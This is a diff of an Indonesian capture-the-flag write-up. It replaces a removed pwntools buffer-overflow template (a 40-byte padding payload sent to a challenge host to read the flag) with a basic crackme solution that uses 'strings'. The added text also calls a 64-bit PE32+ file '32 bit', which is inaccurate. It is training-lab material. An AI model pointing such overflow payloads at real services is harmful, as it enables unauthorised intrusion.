@@ -3,47 +3,23 @@
 ### Category 
 Reverse Engineering.
 
-![overview](./img/chall.png)
+![overview](./img/overview.png)
 
 ### Files
-[chall](./chall.zip)
+[chall.zip](./chall.zip)
 
 ### Analysis
+Sebelum saya ekstrak file nya, terlebih dahulu saya ubah nama folder chall biar memudahkan dalam proses pengerjaan,setelah itu saya cek isi folder dengan isi sebagai berikut
 
+![file](./img/file.png)
 
-### Exploitation
-```python
-#!/usr/bin/python3.8
-
-'''
-You need to install pwntools to run the script.
-To run the script: python3 ./wrapper.py
-'''
-
-# Library
-from pwn import *
-
-# Open connection
-IP   = '154.57.164.69' # Change this
-PORT = 32844      # Change this
-
-r    = remote(IP, PORT)
-
-offset = 40
-# Craft payload
-payload = b'A' * offset # Change the number of "A"s
-
-# Send payload
-r.sendline(payload)
-
-# Read flag
-success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
+Folder chall berisi file executable .exe yang artinya ini adalah file aplikasi windows, setelah itu saya cek filenya sebagai berikut:
 
 ```
+my-first-crackme.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 2 sections
+```
+Program tersebut merupakan executable 32 bit yang berjalan di windows console. Karena ini adalah chall Reverse tingkat dasar , harusnya tidak seribet itu untuk melakukan exploit, berdasarkan deskripsi soal kita hanya disuruh untuk mencari secret password nya saja.
 
-![flag](./img/flag.png)
+### Exploitation
+Saya akan menggunakan perintah 'strings' untuk melihat output program tanpa harus menjalankan programnya, dan setelah itu saya rasa saya telah menemukan secret password yang dimaksud dan menyelesaikan tantangannya.
 
-### References
-- [https://www.luseratech.com/memory-layout-visualizer](https://www.luseratech.com/memory-layout-visualizer)
-- [https://www.geeksforgeeks.org/c/memory-layout-of-c-program/](https://www.geeksforgeeks.org/c/memory-layout-of-c-program/)
-- [https://courses.grainger.illinois.edu/cs225/sp2022/resources/stack-heap/](https://courses.grainger.illinois.edu/cs225/sp2022/resources/stack-heap/)
